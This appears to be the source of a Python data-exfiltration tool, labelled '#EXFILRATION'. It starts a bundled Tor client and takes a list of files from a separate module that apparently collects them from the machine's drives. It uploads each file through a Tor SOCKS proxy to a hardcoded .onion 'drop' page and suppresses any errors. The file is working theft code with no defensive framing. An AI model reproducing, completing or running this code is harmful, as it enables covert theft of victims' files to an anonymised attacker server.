#EXFILRATION    
#LEGS
import requests
import subprocess
import os
import time
import threading
import sys
import Interistinf_Files2


def launch_tor():
    #tor is located at actual_dir/tor/Tor/tor.exe
    actual_dir = os.getcwd()
    tor_dir = actual_dir + "/tor/Tor/tor.exe"
    os.popen(tor_dir)

def start_tor():
    '''
    start tor in a thread without printing anything
    '''
    if not check_if_tor_alive():
        t = threading.Thread(target=launch_tor)
        t.start()
    else :
        print("Tor is already running")

def kill_tor():
    subprocess.Popen("taskkill /f /im tor.exe", shell=False)
    #sys.exit()


def check_if_tor_alive():
    '''
    check if tor is alive
    '''
    actual_public_ip= requests.get('http://httpbin.org/ip').text
    print(actual_public_ip)
    session = requests.session()
    session.proxies = {}
    session.proxies['http'] = 'socks5h://localhost:9050'
    session.proxies['https'] = 'socks5h://localhost:9050'
    try :
        tor_ip= session.get('http://httpbin.org/ip').text
        print(tor_ip)
    except :
        return False
    if actual_public_ip == tor_ip:
        return False
    else:
        return True
    
    
def sending_files(url, files):
    session = requests.session()
    session.proxies = {}
    session.proxies['http'] = 'socks5h://localhost:9050'
    session.proxies['https'] = 'socks5h://localhost:9050'
    
    try:
        for file in files :
            data = {'fileToUpload': open(file, 'rb'), 'submit': 'submit'}
            r = session.post(url, files=data)
    except:
        pass

def main():
    start_tor()
    drives = Interistinf_Files2.main()

    for files in drives:
        print(files)
        sending_files('http://7znv2tbld7nb2xsljnb4h25fcakyezwlknsn3frwrhewcdrncvrbrxyd.onion/test/drop2.php', [files])
    kill_tor()
    return True

#main()
